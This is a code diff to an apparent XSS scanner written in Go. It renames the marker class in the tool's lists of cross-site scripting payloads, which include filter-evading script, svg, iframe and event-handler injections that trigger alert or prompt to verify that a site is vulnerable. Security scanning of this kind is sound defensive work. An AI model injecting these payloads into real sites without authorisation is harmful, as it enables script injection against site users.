@@ -59,26 +59,26 @@ func GetBlindPayload() []string {
 func GetCommonPayload() []string {
 	payload := []string{
 		// include verify payload
-		"\"><SvG/onload=alert(AETHERXSS_ALERT_VALUE) id=aetherxss>",
-		"\"><Svg/onload=alert(AETHERXSS_ALERT_VALUE) class=aetherxss>",
-		"'><sVg/onload=alert(AETHERXSS_ALERT_VALUE) id=aetherxss>",
-		"'><sVg/onload=alert(AETHERXSS_ALERT_VALUE) class=aetherxss>",
-		"</ScriPt><sCripT id=aetherxss>alert(AETHERXSS_ALERT_VALUE)</sCriPt>",
-		"</ScriPt><sCripT class=aetherxss>alert(AETHERXSS_ALERT_VALUE)</sCriPt>",
-		"\"><a href=javas&#99;ript:alert(AETHERXSS_ALERT_VALUE)/class=aetherxss>click",
-		"'><a href=javas&#99;ript:alert(AETHERXSS_ALERT_VALUE)/class=aetherxss>click",
-		"'><svg/class='aetherxss'onLoad=alert(AETHERXSS_ALERT_VALUE)>",
-		"\"><d3\"<\"/onclick=\" class=aetherxss>[confirm``]\"<\">z",
-		"\"><w=\"/x=\"y>\"/class=aetherxss/ondblclick=`<`[confir\u006d``]>z",
-		"\"><iFrAme/src=jaVascRipt:alert(AETHERXSS_ALERT_VALUE) class=aetherxss></iFramE>",
-		"\"><svg/class=\"aetherxss\"onLoad=alert(AETHERXSS_ALERT_VALUE)>",
-		"\"><svg/OnLoad=\"`${prompt``}`\" class=aetherxss>",
-		"'\"><img/src/onerror=.1|alert`` class=aetherxss>",
-		"\"><img/src/onerror=.1|alert`` class=aetherxss>",
-		"'><img/src/onerror=.1|alert`` class=aetherxss>",
-		"'\"><svg/class=aetherxss onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f",
-		"</script><svg><script/class=aetherxss>alert(AETHERXSS_ALERT_VALUE)</script>-%26apos;",
-		"'\"><iframe srcdoc=\"<input onauxclick=alert(AETHERXSS_ALERT_VALUE)>\" class=aetherxss></iframe>",
+		"\"><SvG/onload=alert(AETHERXSS_ALERT_VALUE) id=aether>",
+		"\"><Svg/onload=alert(AETHERXSS_ALERT_VALUE) class=aether>",
+		"'><sVg/onload=alert(AETHERXSS_ALERT_VALUE) id=aether>",
+		"'><sVg/onload=alert(AETHERXSS_ALERT_VALUE) class=aether>",
+		"</ScriPt><sCripT id=aether>alert(AETHERXSS_ALERT_VALUE)</sCriPt>",
+		"</ScriPt><sCripT class=aether>alert(AETHERXSS_ALERT_VALUE)</sCriPt>",
+		"\"><a href=javas&#99;ript:alert(AETHERXSS_ALERT_VALUE)/class=aether>click",
+		"'><a href=javas&#99;ript:alert(AETHERXSS_ALERT_VALUE)/class=aether>click",
+		"'><svg/class='aether'onLoad=alert(AETHERXSS_ALERT_VALUE)>",
+		"\"><d3\"<\"/onclick=\" class=aether>[confirm``]\"<\">z",
+		"\"><w=\"/x=\"y>\"/class=aether/ondblclick=`<`[confir\u006d``]>z",
+		"\"><iFrAme/src=jaVascRipt:alert(AETHERXSS_ALERT_VALUE) class=aether></iFramE>",
+		"\"><svg/class=\"aether\"onLoad=alert(AETHERXSS_ALERT_VALUE)>",
+		"\"><svg/OnLoad=\"`${prompt``}`\" class=aether>",
+		"'\"><img/src/onerror=.1|alert`` class=aether>",
+		"\"><img/src/onerror=.1|alert`` class=aether>",
+		"'><img/src/onerror=.1|alert`` class=aether>",
+		"'\"><svg/class=aether onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f",
+		"</script><svg><script/class=aether>alert(AETHERXSS_ALERT_VALUE)</script>-%26apos;",
+		"'\"><iframe srcdoc=\"<input onauxclick=alert(AETHERXSS_ALERT_VALUE)>\" class=aether></iframe>",
 
 		// not include verify payload
 		"\"><svg/OnLoad=\"`${prompt``}`\">",
@@ -111,14 +111,14 @@ func GetHTMLPayload(ip string) []string {
 		"print",
 	}
 	payloadPattern := []string{
-		"<sVg/onload=AETHERXSS_FUNC_VALUE(AETHERXSS_ALERT_VALUE) class=aetherxss>",
-		"<ScRipt class=aetherxss>AETHERXSS_FUNC_VALUE(AETHERXSS_ALERT_VALUE)</script>",
-		"<iframe srcdoc=\"<input onauxclick=AETHERXSS_FUNC_VALUE(AETHERXSS_ALERT_VALUE)>\" class=aetherxss></iframe>",
-		"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=aetherxss>",
-		"<audio controls ondurationchange=AETHERXSS_FUNC_VALUE(AETHERXSS_ALERT_VALUE) id=aetherxss><source src=1.mp3 type=audio/mpeg></audio>",
-		"<div contextmenu=xss><p>1<menu type=context class=aetherxss id=xss onshow=AETHERXSS_FUNC_VALUE(AETHERXSS_ALERT_VALUE)></menu></div>",
-		"<iFrAme/src=jaVascRipt:AETHERXSS_FUNC_VALUE(AETHERXSS_ALERT_VALUE) class=aetherxss></iFramE>",
-		"<xmp><p title=\"</xmp><svg/onload=AETHERXSS_FUNC_VALUE(AETHERXSS_ALERT_VALUE) class=aetherxss>",
+		"<sVg/onload=AETHERXSS_FUNC_VALUE(AETHERXSS_ALERT_VALUE) class=aether>",
+		"<ScRipt class=aether>AETHERXSS_FUNC_VALUE(AETHERXSS_ALERT_VALUE)</script>",
+		"<iframe srcdoc=\"<input onauxclick=AETHERXSS_FUNC_VALUE(AETHERXSS_ALERT_VALUE)>\" class=aether></iframe>",
+		"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=aether>",
+		"<audio controls ondurationchange=AETHERXSS_FUNC_VALUE(AETHERXSS_ALERT_VALUE) id=aether><source src=1.mp3 type=audio/mpeg></audio>",
+		"<div contextmenu=xss><p>1<menu type=context class=aether id=xss onshow=AETHERXSS_FUNC_VALUE(AETHERXSS_ALERT_VALUE)></menu></div>",
+		"<iFrAme/src=jaVascRipt:AETHERXSS_FUNC_VALUE(AETHERXSS_ALERT_VALUE) class=aether></iFramE>",
+		"<xmp><p title=\"</xmp><svg/onload=AETHERXSS_FUNC_VALUE(AETHERXSS_ALERT_VALUE) class=aether>",
 		"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()>",
 		"<audio controls ondurationchange=v(AETHERXSS_ALERT_VALUE)><source src=1.mp3 type=audio/mpeg></audio>",
 		"<div contextmenu=xss><p>1<menu type=context onshow=alert(AETHERXSS_ALERT_VALUE)></menu></div>",
@@ -126,7 +126,7 @@ func GetHTMLPayload(ip string) []string {
 		"<xmp><p title=\"</xmp><svg/onload=AETHERXSS_FUNC_VALUE(AETHERXSS_ALERT_VALUE)>",
 		"<sVg/onload=AETHERXSS_FUNC_VALUE(AETHERXSS_ALERT_VALUE)>",
 		"<ScRipt>AETHERXSS_FUNC_VALUE(AETHERXSS_ALERT_VALUE)</script>",
-		"<aetherxss class=aetherxss>",
+		"<aether class=aether>",
 	}
 	for _, p := range payloadPattern {
 		if strings.Contains(p, "AETHERXSS_FUNC_VALUE") {
@@ -150,8 +150,8 @@ func GetHTMLPayload(ip string) []string {
 // GetAttrPayload is is return xss
 func GetAttrPayload(ip string) []string {
 	payload := []string{
-		"onpointerenter=prompt`AETHERXSS_ALERT_VALUE` class=aetherxss ",
-		"onmouseleave=confirm(AETHERXSS_ALERT_VALUE) class=aetherxss ",
+		"onpointerenter=prompt`AETHERXSS_ALERT_VALUE` class=aether ",
+		"onmouseleave=confirm(AETHERXSS_ALERT_VALUE) class=aether ",
 	}
 	majorHandler := []string{
 		"onload",
@@ -181,16 +181,16 @@ func GetAttrPayload(ip string) []string {
 		if mh == "oncontentvisibilityautostatechange" {
 			mh = "style=\"display:block;content-visibility:auto;\" oncontentvisibilityautostatechange" // Style needed for trigger
 		}
-		payload = append(payload, mh+"=alert(AETHERXSS_ALERT_VALUE) class=aetherxss ")
-		payload = append(payload, mh+"=confirm(AETHERXSS_ALERT_VALUE) class=aetherxss ")
-		payload = append(payload, mh+"=prompt(AETHERXSS_ALERT_VALUE) class=aetherxss ")
-		payload = append(payload, mh+"=alert.call(null,AETHERXSS_ALERT_VALUE) class=aetherxss ")
-		payload = append(payload, mh+"=confirm.call(null,AETHERXSS_ALERT_VALUE) class=aetherxss ")
-		payload = append(payload, mh+"=prompt.call(null,AETHERXSS_ALERT_VALUE) class=aetherxss ")
-		payload = append(payload, mh+"=alert.apply(null,AETHERXSS_ALERT_VALUE) class=aetherxss ")
-		payload = append(payload, mh+"=confirm.apply(null,AETHERXSS_ALERT_VALUE) class=aetherxss ")
-		payload = append(payload, mh+"=prompt.apply(null,AETHERXSS_ALERT_VALUE) class=aetherxss ")
-		payload = append(payload, mh+"=print(AETHERXSS_ALERT_VALUE) class=aetherxss ")
+		payload = append(payload, mh+"=alert(AETHERXSS_ALERT_VALUE) class=aether ")
+		payload = append(payload, mh+"=confirm(AETHERXSS_ALERT_VALUE) class=aether ")
+		payload = append(payload, mh+"=prompt(AETHERXSS_ALERT_VALUE) class=aether ")
+		payload = append(payload, mh+"=alert.call(null,AETHERXSS_ALERT_VALUE) class=aether ")
+		payload = append(payload, mh+"=confirm.call(null,AETHERXSS_ALERT_VALUE) class=aether ")
+		payload = append(payload, mh+"=prompt.call(null,AETHERXSS_ALERT_VALUE) class=aether ")
+		payload = append(payload, mh+"=alert.apply(null,AETHERXSS_ALERT_VALUE) class=aether ")
+		payload = append(payload, mh+"=confirm.apply(null,AETHERXSS_ALERT_VALUE) class=aether ")
+		payload = append(payload, mh+"=prompt.apply(null,AETHERXSS_ALERT_VALUE) class=aether ")
+		payload = append(payload, mh+"=print(AETHERXSS_ALERT_VALUE) class=aether ")
 	}
 
 	// set html base payloads
@@ -208,9 +208,9 @@ func GetAttrPayload(ip string) []string {
 	/*
 		eh := GetEventHandlers()
 		for _, e := range eh {
-		payload = append(payload, e+"=alert(AETHERXSS_ALERT_VALUE) class=aetherxss ")
-		payload = append(payload, e+"=confirm(AETHERXSS_ALERT_VALUE) class=aetherxss ")
-		payload = append(payload, e+"=prompt(AETHERXSS_ALERT_VALUE) class=aetherxss ")
+		payload = append(payload, e+"=alert(AETHERXSS_ALERT_VALUE) class=aether ")
+		payload = append(payload, e+"=confirm(AETHERXSS_ALERT_VALUE) class=aether ")
+		payload = append(payload, e+"=prompt(AETHERXSS_ALERT_VALUE) class=aether ")
 		//}
 	*/
 
